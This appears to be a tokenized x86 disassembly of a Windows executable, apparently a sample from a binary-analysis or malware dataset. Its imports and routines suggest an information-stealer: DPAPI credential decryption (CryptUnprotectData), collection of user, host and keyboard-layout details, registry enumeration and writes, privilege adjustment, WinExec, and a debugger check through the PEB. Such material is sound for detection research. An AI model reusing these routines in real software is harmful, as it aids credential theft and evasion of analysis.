mov ecx [ ebp - 0x44 ]
call sub_402365
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x10 ] eax
push rw-data
push 0x14
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp - 0x10 ]
call sub_407870
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov ecx rw-data
call sub_407a67
push rw-data
call sub_406e91
pop ecx
call sub_405ef9
call sub_40244a
call sub_406017
call sub_405fe1
push 0x0
call [ ExitProcess@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
leave
retn
push 0x15
call sub_409984
pop ecx
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
je r-xdata
call sub_405ef9
call sub_405e8e
push 0x64
call sub_409984
pop ecx
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x4c ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call sub_409ed4
pop ecx
pop ecx
push 0x7
pop ecx
mov esi r--data
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x30 ]
push eax
call sub_409f34
pop ecx
test eax eax
jbe r-xdata
and [ ebp - 0x70 ] 0x0
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp - 0x50 ]
call sub_4077a2
mov [ ebp - 0x70 ] eax
jmp r-xdata
and [ ebp - 0x74 ] 0x0
push 0x1
mov ecx [ ebp - 0x5c ]
call sub_402365
mov [ ebp - 0x74 ] eax
jmp r-xdata
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp - 0x34 ]
call sub_407870
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x0
je r-xdata
sub_401000
push ecx
mov eax [ fs : 0x18 ]
mov eax [ eax + 0x30 ]
movzx eax [ eax + 0x2 ]
mov [ esp ] eax
mov eax [ esp ]
pop ecx
retn
sub_401018
mov eax [ ecx + 0x8 ]
retn
sub_40101c
mov eax [ ecx + 0x4 ]
retn
sub_401c62
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
call sub_401c44
and [ esi ] 0x0
pop esi
retn
sub_401c72
push esi
mov esi ecx
and [ esi + 0x18 ] 0x0
push 0x3e8
call sub_409984
mov [ esi ] eax
mov [ eax ] 0x0
and [ esi + 0x14 ] 0x0
pop ecx
mov eax esi
pop esi
retn
sub_401c91
retn
sub_4023f0
push [ esp + 0x4 ]
call sub_402381
neg al
sbb eax eax
inc eax
retn 0x4
sub_402d02
xor eax eax
push eax
push eax
push 0xffffffff
push [ esp + 0x10 ]
push eax
push 0xfde9
call [ MultiByteToWideChar@IAT ]
retn
sub_403c4a
mov eax ecx
mov cl [ eax + 0x208 ]
mov [ eax + 0x104 ] cl
mov [ eax ] cl
retn
sub_403cc9
push esi
mov esi ecx
push [ esi + 0x418 ]
call [ HeapDestroy@IAT ]
push [ esi + 0x104 ]
call sub_4092d2
pop ecx
pop esi
retn
sub_403eb6
push esi
mov esi ecx
push [ esi + 0x428 ]
call [ HeapDestroy@IAT ]
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_403cc9
sub_403f9c
push [ ecx + 0x4 ]
call [ HeapDestroy@IAT ]
retn
sub_40407d
mov eax [ ecx ]
retn
sub_404080
mov eax [ esp + 0x4 ]
cmp eax [ ecx ]
jl r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ ecx + eax * 4 ]
xor eax eax
jmp r-xdata
retn 0x4
sub_404250
push esi
mov esi ecx
call sub_403f9c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4092d2
pop ecx
sub_405c44
xor eax eax
cmp [ ecx + 0x8 ] eax
sete al
retn
sub_406bad
mov dl [ ecx ]
push ebx
mov bl [ eax ]
mov [ ecx ] bl
mov [ eax ] dl
pop ebx
retn
sub_407760
push esi
push 0x100
mov esi ecx
call sub_409984
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
retn
sub_407774
push [ ecx ]
call sub_4092d2
pop ecx
retn
sub_40777d
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
call sub_407e64
and [ esi ] 0x0
mov eax esi
pop esi
retn
sub_40778f
push esi
lea esi [ ecx + 0x4 ]
mov ecx esi
call sub_401c44
mov ecx esi
pop esi
jmp sub_407e74
sub_407e64
mov eax ecx
xor ecx ecx
mov [ eax + 0xc ] cl
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
retn
sub_407e92
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
lea eax [ ecx + 0xc ]
mov edx [ esp + 0x4 ]
test edx edx
jl r-xdata
cmp edx [ ecx + 0x8 ]
jge r-xdata
add eax edx
jmp r-xdata
retn 0x4
sub_407f56
push esi
push [ esp + 0xc ]
mov esi ecx
call sub_407eb0
mov ecx [ esp + 0x8 ]
push esi
call sub_407e01
mov eax [ esp + 0x8 ]
pop esi
retn 0x8
sub_4080a9
push esi
mov esi ecx
call sub_401c44
push [ esp + 0xc ]
mov ecx esi
call sub_407eb0
mov ecx [ esp + 0x8 ]
push esi
call sub_407e01
mov eax [ esp + 0x8 ]
pop esi
retn 0x8
sub_408111
push [ esp + 0x4 ]
call sub_408033
neg al
sbb eax eax
inc eax
retn 0x4
sub_408124
push edx
lea edx [ esp + 0x8 ]
sub edx eax
test [ eax + edx ] ecx
sub eax 0x1000
jae r-xdata
pop eax
xchg edx eax
xchg esp eax
jmp [ eax ]
sub_408164
sub esp 0xc
fwait
fnstcw [ esp ]
fldcw [ r--data ]
fistp [ esp + 0x4 ]
fldcw [ esp ]
pop eax
pop eax
pop edx
retn
sub_40817c
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
sete cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_4088d8
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
rol eax cl
retn
sub_4088e4
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
ror eax cl
retn
sub_408fd5
push 0xffffffff
call [ ExitProcess@IAT ]
sub_408fe0
mov eax [ esp + 0x4 ]
cdq
xor eax edx
sub eax edx
retn
sub_408fec
fld [ esp + 0x4 ]
fld st0
fmul st0
fld1
fsubrp st1
fsqrt
fxch st1
fpatan
retn
sub_409000
fld [ esp + 0x4 ]
fld st0
fmul st0
fld1
fsubrp st1
fsqrt
fxch st1
fpatan
retn
sub_40905c
fld [ esp + 0x4 ]
fld st0
fmul st0
fld1
fsubrp st1
fsqrt
fpatan
retn
sub_409070
fld [ esp + 0x4 ]
fld st0
fmul st0
fld1
fsubrp st1
fsqrt
fpatan
retn
sub_4090cc
fld [ esp + 0x4 ]
fld1
fpatan
retn
sub_4090d8
fld [ esp + 0x4 ]
fld [ esp + 0xc ]
fpatan
retn
sub_4090e4
fld [ esp + 0x4 ]
fld [ esp + 0x8 ]
fpatan
retn
sub_4090f0
fld [ esp + 0x4 ]
fld1
fpatan
retn
sub_4090f9
mov eax [ rw-data ]
cmp eax 0x20
jne r-xdata
mov ecx [ esp + 0x4 ]
mov [ eax * 4 + rw-data ] ecx
inc eax
mov [ rw-data ] eax
xor eax eax
retn
or eax 0xffffffff
retn
sub_40911b
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
dec [ rw-data ]
mov eax [ rw-data ]
call [ eax * 4 + rw-data ]
retn
sub_409139
push 0x0
push [ esp + 0x8 ]
call sub_40a0c9
pop ecx
pop ecx
retn
sub_409147
push 0xa
push 0x0
push [ esp + 0xc ]
call sub_40a2d3
add esp 0xc
retn
sub_4091b9
mov eax [ esp + 0x4 ]
imul eax [ esp + 0x8 ]
push eax
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
retn
sub_4091d4
fld [ esp + 0x4 ]
jmp sub_4091de
sub_4091da
fld [ esp + 0x4 ]
sub_4091f8
call [ GetTickCount@IAT ]
sub eax [ rw-data ]
retn
sub_409205
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_409214
fld [ esp + 0x4 ]
fcos
retn
sub_40921c
fld [ esp + 0x4 ]
fcos
retn
sub_4092d2
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn
push [ esp + 0x4 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_409308
call sub_40911b
push 0x0
push rw-data
push rw-data
call sub_408191
push 0x0
push rw-data
push rw-data
call sub_408191
add esp 0x18
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
sub_409364
fld [ esp + 0x4 ]
jmp r-xdata
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_40936a
fld [ esp + 0x4 ]
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_409384
fld [ esp + 0x4 ]
fabs
retn
sub_40938c
fld [ esp + 0x4 ]
fabs
retn
sub_4093ba
xor eax eax
retn
sub_409468
fld [ esp + 0x4 ]
jmp sub_409472
sub_40946e
fld [ esp + 0x4 ]
sub_40948c
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_409591
add esp 0xc
retn
sub_40957e
push [ esp + 0x4 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
retn
sub_409664
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push 0x0
push [ esp + 0x10 ]
push [ eax ]
call [ SetFilePointer@IAT ]
inc eax
neg eax
sbb eax eax
inc eax
retn
sub_4096c0
mov eax [ esp + 0x4 ]
push 0x1
push 0x0
push 0x0
push [ eax ]
call [ SetFilePointer@IAT ]
retn
sub_40977f
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x1a
jb r-xdata
xor eax eax
inc eax
retn
add eax 0xffffffbf
cmp eax 0x1a
jb r-xdata
xor eax eax
retn
sub_40979a
cmp [ esp + 0x4 ] 0x14
jb r-xdata
xor eax eax
inc eax
retn
cmp [ esp + 0x4 ] 0x7f
je r-xdata
xor eax eax
retn
sub_4097da
mov eax [ esp + 0x4 ]
cmp eax 0x20
je r-xdata
xor eax eax
inc eax
retn
add eax 0xfffffff7
cmp eax 0x5
jb r-xdata
xor eax eax
retn
sub_409818
fild [ esp + 0xc ]
fld [ esp + 0x4 ]
fscale
retn
sub_409824
fild [ esp + 0x8 ]
fld [ esp + 0x4 ]
fscale
retn
sub_409830
fldln2
fld [ esp + 0x4 ]
fyl2x
retn
sub_40983c
fldlg2
fld [ esp + 0x4 ]
fyl2x
retn
sub_409848
fldlg2
fld [ esp + 0x4 ]
fyl2x
retn
sub_409854
fld1
fld [ esp + 0x4 ]
fyl2x
retn
sub_409860
fld1
fld [ esp + 0x4 ]
fyl2x
retn
sub_40986c
fldln2
fld [ esp + 0x4 ]
fyl2x
retn
sub_409875
mov eax [ rw-data ]
test eax eax
jne r-xdata
push [ esp + 0x4 ]
push 0x0
push eax
call [ HeapAlloc@IAT ]
retn
call [ GetProcessHeap@IAT ]
mov [ rw-data ] eax
sub_409c0b
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_409c15
mov eax [ rw-data ]
imul eax eax 0x41c64e6d
add eax 0x3039
mov [ rw-data ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_409c33
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
imul eax eax 0x41c64e6d
add eax 0x3039
mov [ ecx ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_409c77
push 0xf0000000
push 0x1
push 0x0
push 0x0
push rw-data
call [ CryptAcquireContextA@IAT ]
neg eax
sbb eax eax
inc eax
retn
sub_409c93
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
sub_409ca6
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
retn
sub_409cbd
push [ esp + 0x4 ]
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
inc eax
retn
sub_409ccd
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ MoveFileA@IAT ]
neg eax
sbb eax eax
inc eax
retn
sub_409ce1
xor eax eax
push eax
push eax
push eax
mov eax [ esp + 0x10 ]
push [ eax ]
call [ SetFilePointer@IAT ]
retn
sub_409cf4
fld [ esp + 0x4 ]
jmp sub_409cfe
sub_409cfa
fld [ esp + 0x4 ]
sub_409d44
fld [ esp + 0x4 ]
fsin
retn
sub_409d4c
fld [ esp + 0x4 ]
fsin
retn
sub_409dc9
lea eax [ esp + 0xc ]
push eax
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ wvsprintfA@IAT ]
retn
sub_409de0
fld [ esp + 0x4 ]
fsqrt
retn
sub_409de8
fld [ esp + 0x4 ]
fsqrt
retn
sub_409e75
mov eax [ esp + 0x4 ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
movsx ecx cl
cmp ecx [ esp + 0x8 ]
je r-xdata
xor eax eax
retn
inc eax
sub_409eb0
push 0xffffffff
push [ esp + 0xc ]
push 0xffffffff
push [ esp + 0x10 ]
push 0x0
push 0x800
call [ CompareStringA@IAT ]
lea ecx [ eax - 0x2 ]
neg eax
sbb eax eax
and eax ecx
retn
sub_409ed4
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
push ecx
mov al [ edx ]
inc edx
mov [ ecx ] al
inc ecx
test al al
jne r-xdata
pop eax
retn
sub_409f22
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ lstrcmpiA@IAT ]
retn
j_sub_40a2d3
jmp sub_40a2d3
sub_40a3c4
fld [ esp + 0x4 ]
fptan
fstp st0
retn
sub_40a3d0
fld [ esp + 0x4 ]
fptan
fstp st0
retn
sub_40a44e
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x1a
jae r-xdata
retn
add eax 0x20
sub_40a45e
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x1a
jae r-xdata
retn
add eax 0xffffffe0
sub_40a470
fld [ esp + 0x4 ]
jmp sub_40a47a
sub_40a491
mov eax [ esp + 0x4 ]
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
retn
mov ecx [ esp + 0x8 ]
cmp [ ecx + 0x4 ] 0xffffffff
jne r-xdata
mov [ ecx + 0x4 ] eax
retn
sub_40a55d
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ wvsprintfA@IAT ]
retn
sub_40a595
mov eax [ esp + 0x4 ]
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx [ esp + 0x8 ]
je r-xdata
xor eax eax
retn
inc eax
inc eax
sub_40a5d6
push 0xffffffff
push [ esp + 0xc ]
push 0xffffffff
push [ esp + 0x10 ]
push 0x0
push 0x800
call [ CompareStringW@IAT ]
lea ecx [ eax - 0x2 ]
neg eax
sbb eax eax
and eax ecx
retn
sub_40a65a
mov ecx [ esp + 0x4 ]
xor eax eax
cmp [ ecx ] ax
je r-xdata
retn
inc eax
cmp [ ecx + eax * 2 ] 0x0
jne r-xdata
sub_40a984
push 0x0
call [ ExitProcess@IAT ]
sub_40a9d7
pop ebx
mov eax [ ebp - 0xc ]
sub ebx 0x7
add ebx eax
jmp ebx
sub_40a9e8
retn
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetCurrentDirectoryA
jmp [ GetCurrentDirectoryA@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetSystemTime
jmp [ GetSystemTime@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetDriveTypeA
jmp [ GetDriveTypeA@IAT ]
GetLogicalDrives
jmp [ GetLogicalDrives@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
LocalFree
jmp [ LocalFree@IAT ]
lstrlenA
jmp [ lstrlenA@IAT ]
FileTimeToSystemTime
jmp [ FileTimeToSystemTime@IAT ]
GetFileTime
jmp [ GetFileTime@IAT ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
Sleep
jmp [ Sleep@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcatA
jmp [ lstrcatA@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
lstrlenW
jmp [ lstrlenW@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
WinExec
jmp [ WinExec@IAT ]
GetTempFileNameA
jmp [ GetTempFileNameA@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
OpenProcess
jmp [ OpenProcess@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
HeapCreate
jmp [ HeapCreate@IAT ]
HeapDestroy
jmp [ HeapDestroy@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
MapViewOfFile
jmp [ MapViewOfFile@IAT ]
CreateFileMappingA
jmp [ CreateFileMappingA@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
UnmapViewOfFile
jmp [ UnmapViewOfFile@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
CreateNamedPipeA
jmp [ CreateNamedPipeA@IAT ]
GetShortPathNameA
jmp [ GetShortPathNameA@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
SetErrorMode
jmp [ SetErrorMode@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
OutputDebugStringA
jmp [ OutputDebugStringA@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
GetEnvironmentVariableA
jmp [ GetEnvironmentVariableA@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
MoveFileA
jmp [ MoveFileA@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
lstrcmpiA
jmp [ lstrcmpiA@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
SetPriorityClass
jmp [ SetPriorityClass@IAT ]
EnumDisplaySettingsA
jmp [ EnumDisplaySettingsA@IAT ]
GetSystemMetrics
jmp [ GetSystemMetrics@IAT ]
GetKeyboardLayoutNameA
jmp [ GetKeyboardLayoutNameA@IAT ]
wsprintfA
jmp [ wsprintfA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
wvsprintfA
jmp [ wvsprintfA@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetUserNameA
jmp [ GetUserNameA@IAT ]
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
RegEnumKeyExA
jmp [ RegEnumKeyExA@IAT ]
RegQueryInfoKeyA
jmp [ RegQueryInfoKeyA@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegEnumValueA
jmp [ RegEnumValueA@IAT ]
RegEnumKeyA
jmp [ RegEnumKeyA@IAT ]
RegOpenKeyA
jmp [ RegOpenKeyA@IAT ]
RegQueryValueExW
jmp [ RegQueryValueExW@IAT ]
RegEnumValueW
jmp [ RegEnumValueW@IAT ]
OpenProcessToken
jmp [ OpenProcessToken@IAT ]
RegSetValueExA
jmp [ RegSetValueExA@IAT ]
RegCreateKeyA
jmp [ RegCreateKeyA@IAT ]
AdjustTokenPrivileges
jmp [ AdjustTokenPrivileges@IAT ]
LookupPrivilegeValueA
jmp [ LookupPrivilegeValueA@IAT ]
CryptGenRandom
jmp [ CryptGenRandom@IAT ]
CryptAcquireContextA
jmp [ CryptAcquireContextA@IAT ]
CryptReleaseContext
jmp [ CryptReleaseContext@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
SafeArrayPutElement
jmp [ SafeArrayPutElement@IAT ]
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SysAllocString
jmp [ SysAllocString@IAT ]
VariantInit
jmp [ VariantInit@IAT ]
SHGetFolderPathA
jmp [ SHGetFolderPathA@IAT ]
SHGetSpecialFolderPathA
jmp [ SHGetSpecialFolderPathA@IAT ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
OleInitialize
jmp [ OleInitialize@IAT ]
GetModuleFileNameExA
jmp [ GetModuleFileNameExA@IAT ]
EnumProcesses
jmp [ EnumProcesses@IAT ]
CryptUnprotectData
jmp [ CryptUnprotectData@IAT ]
GetNetworkParams
jmp [ GetNetworkParams@IAT ]
sub_40afac
mov ecx rw-data
call sub_407e64
and [ rw-data ] 0x0
push sub_40afd3
call sub_4090f9
pop ecx
retn
sub_40afc9
mov ecx rw-data
jmp sub_407e74
sub_40afd3
push esi
mov esi rw-data
mov ecx esi
call sub_401c44
mov ecx esi
pop esi
jmp sub_407e74
